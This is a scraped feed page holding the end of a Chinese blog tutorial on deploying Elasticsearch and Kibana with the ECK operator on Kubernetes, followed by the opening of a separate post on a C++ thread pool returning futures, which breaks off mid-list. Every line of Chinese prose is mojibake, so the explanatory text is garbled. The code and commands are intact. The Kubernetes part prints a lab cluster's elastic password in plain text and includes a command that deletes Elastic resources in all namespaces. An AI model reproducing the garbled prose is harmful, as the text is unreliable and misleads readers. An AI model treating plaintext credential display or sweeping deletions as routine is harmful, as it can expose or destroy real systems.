<h3 data-id="heading-15">æŸ¥çœ‹æœåŠ¡çŠ¶æ€ä»¥åŠå¯†ç ä¿¡æ¯</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# kubectl get kibana
NAME         HEALTH   NODES   VERSION   AGE
quickstart   red              9.2.2     16s
[root@k8s-192-168-1-140 ~]# 
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹å¯†ç </span>
[root@k8s-192-168-1-140 ~]# kubectl get secret quickstart-es-elastic-user -o=jsonpath='{.data.elastic}' | base64 --decode; echo
V3VPqwQMURTSg6zFYvVIsH13
[root@k8s-192-168-1-140 ~]#


[root@k8s-192-168-1-140 ~]# kubectl get service 
NAME                          TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
kubernetes                    ClusterIP   10.68.0.1       &lt;none&gt;        443/TCP        81d
nginx                         NodePort    10.68.148.53    &lt;none&gt;        80:30330/TCP   81d
quickstart-es-default         ClusterIP   None            &lt;none&gt;        9200/TCP       2m47s
quickstart-es-http            ClusterIP   10.68.66.232    &lt;none&gt;        9200/TCP       2m48s
quickstart-es-internal-http   ClusterIP   10.68.121.73    &lt;none&gt;        9200/TCP       2m48s
quickstart-es-transport       ClusterIP   None            &lt;none&gt;        9300/TCP       2m48s
quickstart-kb-http            ClusterIP   10.68.103.103   &lt;none&gt;        5601/TCP       24s
[root@k8s-192-168-1-140 ~]# 

[root@k8s-192-168-1-140 ~]# kubectl get service quickstart-kb-http
NAME                 TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE
quickstart-kb-http   ClusterIP   10.68.103.103   &lt;none&gt;        5601/TCP   2m39s
[root@k8s-192-168-1-140 ~]# 
</code></pre>
<h3 data-id="heading-16">å¼€å¯è®¿é—®</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~] kubectl port-forward --address 0.0.0.0 service/quickstart-kb-http 5601
Forwarding from 0.0.0.0:5601 -&gt; 5601
<span class="hljs-meta prompt_">


# </span><span class="bash">ç™»å½•åœ°å€</span>
https://192.168.1.140:5601/login

ç”¨æˆ·ï¼š
elastic

å¯†ç ï¼š
V3VPqwQMURTSg6zFYvVIsH13
</code></pre>
<h3 data-id="heading-17">ä¿®æ”¹ESå‰¯æœ¬æ•°</h3>
<pre><code class="hljs language-shell" lang="shell">cat &lt;&lt;EOF | kubectl apply -f -
apiVersion: elasticsearch.k8s.elastic.co/v1
kind: Elasticsearch
metadata:
  name: quickstart
spec:
  version: 9.2.2
  nodeSets:
  - name: default
    count: 3
    config:
      node.store.allow_mmap: false
EOF
</code></pre>
<h3 data-id="heading-18">æŸ¥çœ‹çŠ¶æ€</h3>
<pre><code class="hljs language-shell" lang="shell">[root@k8s-192-168-1-140 ~]# kubectl get pod -A
NAMESPACE        NAME                                       READY   STATUS    RESTARTS            AGE
default          nfs-client-provisioner-58d465c998-w8mfq    1/1     Running   0                   5h38m
default          nginx-66686b6766-tdwt2                     1/1     Running   2 (&lt;invalid&gt; ago)   81d
default          quickstart-es-default-0                    1/1     Running   0                   5h51m
default          quickstart-kb-57cc78f6b8-b8fpf             1/1     Running   0                   5h24m
elastic-system   elastic-operator-0                         1/1     Running   0                   6h2m
kube-system      calico-kube-controllers-78dcb7b647-8f2ph   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      calico-node-hpwvr                          1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      coredns-6746f4cb74-bhkv8                   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      metrics-server-55c56cb875-bwbpr            1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      node-local-dns-nz4q7                       1/1     Running   2 (&lt;invalid&gt; ago)   81d
[root@k8s-192-168-1-140 ~]# kubectl get pod -A -w
NAMESPACE        NAME                                       READY   STATUS    RESTARTS            AGE
default          nfs-client-provisioner-58d465c998-w8mfq    1/1     Running   0                   5h38m
default          nginx-66686b6766-tdwt2                     1/1     Running   2 (&lt;invalid&gt; ago)   81d
default          quickstart-es-default-0                    1/1     Running   0                   5h51m
default          quickstart-kb-57cc78f6b8-b8fpf             1/1     Running   0                   5h24m
elastic-system   elastic-operator-0                         1/1     Running   0                   6h2m
kube-system      calico-kube-controllers-78dcb7b647-8f2ph   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      calico-node-hpwvr                          1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      coredns-6746f4cb74-bhkv8                   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      metrics-server-55c56cb875-bwbpr            1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      node-local-dns-nz4q7                       1/1     Running   2 (&lt;invalid&gt; ago)   81d




default          quickstart-es-default-1                    0/1     Pending   0                   0s
default          quickstart-es-default-1                    0/1     Pending   0                   0s
default          quickstart-es-default-1                    0/1     Pending   0                   0s
default          quickstart-es-default-1                    0/1     Init:0/2   0                   0s
default          quickstart-es-default-1                    0/1     Init:0/2   0                   1s
default          quickstart-es-default-0                    1/1     Running    0                   5h51m
default          quickstart-es-default-1                    0/1     Init:0/2   0                   1s
default          quickstart-es-default-0                    1/1     Running    0                   5h51m
default          quickstart-es-default-1                    0/1     Init:0/2   0                   2s
default          quickstart-es-default-1                    0/1     Init:1/2   0                   3s
default          quickstart-es-default-1                    0/1     PodInitializing   0                   4s
default          quickstart-es-default-1                    0/1     Running           0                   5s
default          quickstart-es-default-1                    1/1     Running           0                   26s
default          quickstart-es-default-2                    0/1     Pending           0                   0s
default          quickstart-es-default-2                    0/1     Pending           0                   0s
default          quickstart-es-default-2                    0/1     Pending           0                   0s
default          quickstart-es-default-2                    0/1     Init:0/2          0                   0s
default          quickstart-es-default-2                    0/1     Init:0/2          0                   1s
default          quickstart-es-default-0                    1/1     Running           0                   5h51m
default          quickstart-es-default-1                    1/1     Running           0                   30s
default          quickstart-es-default-2                    0/1     Init:0/2          0                   2s
default          quickstart-es-default-1                    1/1     Running           0                   30s
default          quickstart-es-default-2                    0/1     Init:0/2          0                   2s
default          quickstart-es-default-0                    1/1     Running           0                   5h51m
default          quickstart-es-default-2                    0/1     Init:1/2          0                   3s
default          quickstart-es-default-2                    0/1     PodInitializing   0                   4s
default          quickstart-es-default-2                    0/1     Running           0                   5s
default          quickstart-es-default-2                    1/1     Running           0                   33s
^C[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]# 
[root@k8s-192-168-1-140 ~]# kubectl get pod -A -w

NAMESPACE        NAME                                       READY   STATUS    RESTARTS            AGE
default          nfs-client-provisioner-58d465c998-w8mfq    1/1     Running   0                   5h40m
default          nginx-66686b6766-tdwt2                     1/1     Running   2 (&lt;invalid&gt; ago)   81d
default          quickstart-es-default-0                    1/1     Running   0                   5h53m
default          quickstart-es-default-1                    1/1     Running   0                   2m19s
default          quickstart-es-default-2                    1/1     Running   0                   111s
default          quickstart-kb-57cc78f6b8-b8fpf             1/1     Running   0                   5h26m
elastic-system   elastic-operator-0                         1/1     Running   0                   6h4m
kube-system      calico-kube-controllers-78dcb7b647-8f2ph   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      calico-node-hpwvr                          1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      coredns-6746f4cb74-bhkv8                   1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      metrics-server-55c56cb875-bwbpr            1/1     Running   2 (&lt;invalid&gt; ago)   81d
kube-system      node-local-dns-nz4q7                       1/1     Running   2 (&lt;invalid&gt; ago)   81d

</code></pre>
<h3 data-id="heading-19">å¸è½½åˆ é™¤</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">
# </span><span class="bash">åˆ é™¤æ‰€æœ‰å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰Elasticèµ„æº</span>
kubectl get namespaces --no-headers -o custom-columns=:metadata.name \
  | xargs -n1 kubectl delete elastic --all -n
<span class="hljs-meta prompt_">
# </span><span class="bash">åˆ é™¤operator</span>
kubectl delete -f https://download.elastic.co/downloads/eck/3.2.0/operator.yaml
kubectl delete -f https://download.elastic.co/downloads/eck/3.2.0/crds.yaml
</code></pre>
<p><strong>å…³äº</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oiox.cn%2F" target="_blank" title="https://www.oiox.cn/" ref="nofollow noopener noreferrer">www.oiox.cn/</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oiox.cn%2Findex.php%2Fstart-page.html" target="_blank" title="https://www.oiox.cn/index.php/start-page.html" ref="nofollow noopener noreferrer">www.oiox.cn/index.php/sâ€¦</a></p>
<p><strong>CSDNã€GitHubã€çŸ¥ä¹ã€å¼€æºä¸­å›½ã€æ€å¦ã€æ˜é‡‘ã€ç®€ä¹¦ã€åä¸ºäº‘ã€é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€å“”å“©å“”å“©ã€ä»Šæ—¥å¤´æ¡ã€æ–°æµªå¾®åšã€ä¸ªäººåšå®¢</strong></p>
<p><strong>å…¨ç½‘å¯æœã€Šå°é™ˆè¿ç»´ã€‹</strong></p>
<p><strong>æ–‡ç« ä¸»è¦å‘å¸ƒäºå¾®ä¿¡å…¬ä¼—å·ï¼šã€ŠLinuxè¿ç»´äº¤æµç¤¾åŒºã€‹</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day5ï¼šçº¿ç¨‹æ± è¿›é˜¶â€”â€”æˆ‘ä»ã€Œåªä¼šè·‘ void ä»»åŠ¡ã€åˆ°ã€Œèƒ½è¿”å› futureã€ï¼Œå¹¶ç”¨ Demo éªŒè¯è·‘é€š]]></title>    <link>https://juejin.cn/post/7582849187864657971</link>    <guid>https://juejin.cn/post/7582849187864657971</guid>    <pubDate>2025-12-12T14:55:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582849187864657971" data-draft-id="7582814236583264294" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day5ï¼šçº¿ç¨‹æ± è¿›é˜¶â€”â€”æˆ‘ä»ã€Œåªä¼šè·‘ void ä»»åŠ¡ã€åˆ°ã€Œèƒ½è¿”å› futureã€ï¼Œå¹¶ç”¨ Demo éªŒè¯è·‘é€š"/> <meta itemprop="keywords" content="æ“ä½œç³»ç»Ÿ"/> <meta itemprop="datePublished" content="2025-12-12T14:55:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‚†å¿†_"/> <meta itemprop="url" content="https://juejin.cn/user/3898194938326714"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day5ï¼šçº¿ç¨‹æ± è¿›é˜¶â€”â€”æˆ‘ä»ã€Œåªä¼šè·‘ void ä»»åŠ¡ã€åˆ°ã€Œèƒ½è¿”å› futureã€ï¼Œå¹¶ç”¨ Demo éªŒè¯è·‘é€š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3898194938326714/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‚†å¿†_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T14:55:08.000Z" title="Fri Dec 12 2025 14:55:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™æ˜¯æˆ‘æ“ä½œç³»ç»Ÿ / å¤šçº¿ç¨‹æ‰‹æ’•é¢˜çš„ <strong>Day5</strong>ã€‚<br/>
Day4 æˆ‘å·²ç»å†™å‡ºäº†åŸºç¡€çº¿ç¨‹æ± ï¼šé˜Ÿåˆ—é‡Œæ”¾ <code>std::function&lt;void()&gt;</code>ï¼Œworker çº¿ç¨‹å¾ªç¯å–ä»»åŠ¡æ‰§è¡Œã€‚</p>
<p>ä½†æˆ‘ Day5 çš„æ ¸å¿ƒè¯‰æ±‚å¾ˆç°å®ï¼š</p>
<blockquote>
<p><strong>æˆ‘å¸Œæœ›çº¿ç¨‹æ± æäº¤ä¸€ä¸ª <code>int()</code> ä»»åŠ¡åï¼Œèƒ½æ‹¿åˆ°è¿”å›å€¼ã€‚</strong><br/>
æˆ‘æƒ³è¦çš„æ˜¯ï¼šæäº¤ä»»åŠ¡ç«‹åˆ»è¿”å›ï¼›ç»“æœä»€ä¹ˆæ—¶å€™å–ç”±è°ƒç”¨è€…å†³å®šã€‚</p>
</blockquote>
<p>æœ€ç»ˆæˆ‘æŠŠè¿›é˜¶ç‰ˆæœ¬è·‘é€šäº†ï¼Œå¹¶ç”¨ä¸€ä¸ªéªŒè¯ demo å¾—åˆ°è¾“å‡ºï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[main]</span> submit tasks, main thread <span class="hljs-attr">id</span> = <span class="hljs-number">111212</span>
<span class="hljs-section">[task1]</span> submit tasks, task1 thread <span class="hljs-attr">id</span> = <span class="hljs-number">111172</span>
<span class="hljs-section">[task2]</span> submit tasks, task2 thread <span class="hljs-attr">id</span> = <span class="hljs-number">125744</span>
<span class="hljs-section">[task3]</span> submit tasks, task3 thread <span class="hljs-attr">id</span> = <span class="hljs-number">111172</span>
<span class="hljs-section">[main]</span> f2 not ready after 50ms (expected timeout)
<span class="hljs-section">[main]</span> results: 1, 2, 3
<span class="hljs-section">[main]</span> done
</code></pre>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æˆ‘ä¸€å¼€å§‹æ²¡æ‡‚çš„ã€Œè¿›é˜¶çº¿ç¨‹æ± ç»“æ„ã€åˆ°åº•é•¿å•¥æ ·ï¼Ÿ</h2>
<h3 data-id="heading-1">1.1 Day4 çš„çº¿ç¨‹æ± ç»“æ„ï¼ˆæˆ‘å·²ç»ä¼šäº†ï¼‰</h3>
<ul>
<li>ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ï¼š<code>queue&lt;function&lt;void()&gt;&gt; tasks_</code></li>
<li>ä¸€å † worker çº¿ç¨‹ï¼šå¾ªç¯ wait â†’ pop â†’ æ‰§è¡Œ <code>fn()</code></li>
<li><code>Enqueue()</code> å¾€é˜Ÿåˆ—é‡Œå¡ <code>void()</code> ä»»åŠ¡</li>
</ul>
<p><strong>é—®é¢˜</strong>ï¼šå¦‚æœä»»åŠ¡æœ‰è¿”å›å€¼ï¼ˆæ¯”å¦‚ <code>int()</code>ï¼‰ï¼Œworker åªä¼šæ‰§è¡Œ <code>void()</code>ï¼Œè¿”å›å€¼æ€ä¹ˆä¼ å›æ¥ï¼Ÿ</p>
<h3 data-id="heading-2">1.2 æˆ‘ Day5 çš„ç›®æ ‡ç»“æ„ï¼ˆä»Šå¤©æ‰çœŸæ­£ç†è§£ï¼‰</h3>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼šæ‰§è¡Œç«¯ï¼ˆworkerï¼‰ä¸éœ€è¦ç†è§£â€œè¿”å›å€¼â€ï¼Œå®ƒåªéœ€è¦æ‰§è¡Œ <code>void()</code>ã€‚<br/>
è¿”å›å€¼èµ°å¦ä¸€æ¡é€šé“ï¼š<code>future</code>ã€‚</p>
<ul>
<li>
<p>é˜Ÿåˆ—é‡Œä»ç„¶åªæ”¾ï¼š<code>std::function&lt;void()&gt;</code></p>
</li>
<li>
<p>ä½†æ˜¯æˆ‘å¯ä»¥æŠŠä¸€ä¸ª <code>int()</code> ä»»åŠ¡åŒ…è£…æˆ <code>void()</code>ï¼š</p>
<ul>
<li><code>void()</code> é‡Œæ‰§è¡Œ <code>packaged_task&lt;int()&gt;</code></li>
<li><code>packaged_task</code> ä¼šæŠŠç»“æœå†™è¿› <code>future&lt;int&gt;</code> çš„å…±äº«çŠ¶æ€</li>
</ul>
</li>
<li>
<p><code>EnqueueInt()</code> è¿”å› <code>future&lt;int&gt;</code> ç»™è°ƒç”¨è€…</p>
</li>
<li>
<p>è°ƒç”¨è€…æƒ³ä»€ä¹ˆæ—¶å€™æ‹¿ç»“æœï¼Œå°±ä»€ä¹ˆæ—¶å€™ <code>get()</code> / <code>wait_for()</code></p>
</li>
</ul>
<p>è¿™å°±æ˜¯æˆ‘ä»Šå¤©åå¤ç¡®è®¤çš„é‚£å¥è¯ï¼š</p>
<blockquote>
<p><strong>è°ƒç”¨è€…è‡ªå·±å†³å®šä»€ä¹ˆæ—¶å€™ get()ï¼ˆä¹Ÿå¯ä»¥ä¸ getã€ä¹Ÿå¯ä»¥ wait_forï¼‰</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-3">äºŒã€æˆ‘é—®è¿‡çš„å°é—®é¢˜ï¼šè¿™é‡Œçš„â€œè°ƒç”¨è€…â€åˆ°åº•æŒ‡è°ï¼Ÿ</h2>
<p>æˆ‘å½“æ—¶æœ‰ç‚¹å¡åœ¨è¯ä¸Šï¼šåˆ°åº•è°æ˜¯è°ƒç”¨è€…ï¼Ÿ</p>
<p><strong>ç»“è®º</strong>ï¼šè°ƒç”¨è€…å°±æ˜¯â€œè°ƒç”¨ <code>EnqueueInt()</code> çš„é‚£ä¸ªäººâ€ã€‚åœ¨æˆ‘çš„ demo é‡Œå°±æ˜¯ <code>main()</code>ã€‚</p>
<ul>
<li><code>EnqueueInt()</code> çš„èŒè´£ï¼šæäº¤ä»»åŠ¡ + è¿”å› <code>future&lt;int&gt;</code></li>
<li><code>main()</code> çš„èŒè´£ï¼šå†³å®šä»€ä¹ˆæ—¶å€™å–ç»“æœï¼ˆ<code>get()</code> / <code>wait()</code> / <code>wait_for()</code>ï¼‰</li>
</ul>
<p>è¿™ä¹Ÿè§£é‡Šäº†æˆ‘è‡ªå·±çš„é‚£æ®µç†è§£ï¼ˆåæ¥ä½ ä¹Ÿç¡®è®¤äº†æˆ‘æ–¹å‘å¯¹ï¼‰ï¼š</p>
<blockquote>
<p><code>EnqueueInt()</code> è¿”å› futureï¼›çœŸæ­£çš„è¿”å›å€¼ç”±è°ƒç”¨è€…ä»€ä¹ˆæ—¶å€™ <code>get()</code> å†³å®šã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€ç‰ˆæœ¬è¿­ä»£ 1ï¼šæˆ‘å†™å‡ºäº† EnqueueIntï¼Œä½†å‡ºç°äº†ä¸¤ä¸ªâ€œç†è§£å‹å‘â€</h2>
<p>æˆ‘å½“æ—¶çš„é›å½¢æ˜¯ï¼š</p>
<ul>
<li><code>std::packaged_task&lt;int()&gt; pt(task);</code></li>
<li><code>auto fut = pt.get_future();</code></li>
<li>æŠŠ <code>pt</code> æ”¾è¿›é˜Ÿåˆ—ï¼Œè®© worker æ‰§è¡Œ</li>
<li>return <code>fut</code></li>
</ul>
<p>è¿™é‡Œå‡ºç°ä¸¤ä¸ªå…³é”®é—®é¢˜ï¼Œéƒ½æ˜¯æˆ‘åæ¥é€æ­¥é—®å‡ºæ¥çš„ã€‚</p>
<h3 data-id="heading-5">3.1 æˆ‘é—®ï¼šä¸ºä»€ä¹ˆ <code>&amp;ThreadPool::Work, this</code> è¿™ä¹ˆå†™ï¼Ÿæˆ‘ä»¥å‰ä¸æ˜¯ä¹Ÿèƒ½å†™å—ï¼Ÿ</h3>
<p>æˆ‘å½“æ—¶è§‰å¾—â€œWork å’Œæ„é€ å‡½æ•°éƒ½åœ¨ä¸€ä¸ªç±»é‡Œâ€ï¼Œä¸ºä»€ä¹ˆè¿˜è¦å†™å¾—è¿™ä¹ˆéº»çƒ¦ã€‚</p>
<h4 data-id="heading-6">æ­£ç¡®ç†è§£</h4>
<p><code>Work</code> æ˜¯<strong>æˆå‘˜å‡½æ•°</strong>ï¼Œä¸æ˜¯æ™®é€šå‡½æ•°ã€‚æˆå‘˜å‡½æ•°å¿…é¡»ä¾èµ–å¯¹è±¡æ‰èƒ½è¢«è°ƒç”¨ï¼Œæœ¬è´¨ä¸Šæ˜¯ï¼š</p>
<ul>
<li>æ™®é€šå‡½æ•°ï¼š<code>Work()</code></li>
<li>æˆå‘˜å‡½æ•°ï¼š<code>this-&gt;Work()</code></li>
</ul>
<p>å½“æˆ‘ç”¨ <code>std::thread</code> å¯åŠ¨çº¿ç¨‹æ—¶ï¼Œçº¿ç¨‹å…¥å£éœ€è¦ä¸€ä¸ªâ€œå¯è°ƒç”¨å¯¹è±¡â€ã€‚<br/>
æˆå‘˜å‡½æ•°è¦æˆä¸ºâ€œå¯è°ƒç”¨â€ï¼Œå¿…é¡»åŒæ—¶æä¾›ä¸¤æ ·ä¸œè¥¿ï¼š</p>
<ol>
<li>æˆå‘˜å‡½æ•°æŒ‡é’ˆï¼š<code>&amp;ThreadPool::Work</code></li>
<li>å¯¹è±¡æŒ‡é’ˆï¼š<code>this</code></li>
</ol>
<p>æ‰€ä»¥æ ‡å‡†å†™æ³•æ˜¯ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">workers_.emplace_back(&amp;ThreadPool::Work, <span class="hljs-keyword">this</span>);
</code></pre>
<h4 data-id="heading-7">æˆ‘è¿½é—®çš„â€œæ˜¯ä¸æ˜¯å› ä¸ºå‡½æ•°ç±»å‹æ‰€ä»¥è¦åŠ  &amp;ï¼Ÿâ€</h4>
<p>æ›´å‡†ç¡®ï¼šä¸æ˜¯â€œå› ä¸ºå‡½æ•°ç±»å‹â€ï¼Œè€Œæ˜¯â€œå› ä¸ºè¦å–æˆå‘˜å‡½æ•°æŒ‡é’ˆâ€ã€‚<br/>
<code>&amp;ThreadPool::Work</code> è¡¨ç¤ºâ€œæŒ‡å‘æˆå‘˜å‡½æ•° Work çš„æŒ‡é’ˆâ€ï¼ˆpointer-to-member-functionï¼‰ã€‚</p>
<hr/>
<h3 data-id="heading-8">3.2 æˆ‘é—®ï¼š<code>pt</code> ä¸æ˜¯å’Œ <code>fut</code> ç»‘å®šå—ï¼Ÿ<code>pt</code> æ˜¯å±€éƒ¨å˜é‡é”€æ¯åï¼Œ<code>fut</code> è¿˜èƒ½æœ‰æ•ˆå—ï¼Ÿ</h3>
<p>è¿™ä¸ªé—®é¢˜éå¸¸å…³é”®ï¼Œæˆ‘å½“æ—¶ç¡®å®æ²¡æƒ³é€šã€‚</p>
<h4 data-id="heading-9">æ­£ç¡®ç†è§£ï¼š<code>future</code> ä¸â€œç»‘åœ¨ pt èº«ä¸Šâ€ï¼Œå®ƒä»¬æ˜¯<strong>å…±äº«åŒä¸€ä»½å…±äº«çŠ¶æ€</strong></h4>
<ul>
<li><code>packaged_task</code> å†…éƒ¨æŒæœ‰ä¸€ä¸ªâ€œå…±äº«çŠ¶æ€â€ï¼ˆshared stateï¼‰</li>
<li><code>pt.get_future()</code> è¿”å›çš„ <code>future</code> ä¹ŸæŒ‡å‘è¿™ä»½å…±äº«çŠ¶æ€</li>
<li><strong>å…±äº«çŠ¶æ€æ‰æ˜¯â€œç»“æœå­˜æ”¾åœ°â€</strong></li>
</ul>
<p>æ‰€ä»¥ï¼š</p>
<ul>
<li>
<p><code>pt</code> æ˜¯å±€éƒ¨å˜é‡å¹¶ä¸ç­‰äº <code>fut</code> ç«‹åˆ»å¤±æ•ˆ</p>
</li>
<li>
<p>ä½†å¦‚æœ <code>pt</code> è¢«é”€æ¯æ—¶å…±äº«çŠ¶æ€è¿˜æ²¡è¢«å†™å…¥ç»“æœï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li>è¦ä¹ˆ <code>future</code> æ°¸è¿œç­‰ä¸åˆ°ç»“æœï¼ˆå¡ä½ï¼‰</li>
<li>è¦ä¹ˆå˜æˆâ€œbroken promiseâ€ï¼ˆ<code>get()</code> æŠ›å¼‚å¸¸ï¼‰</li>
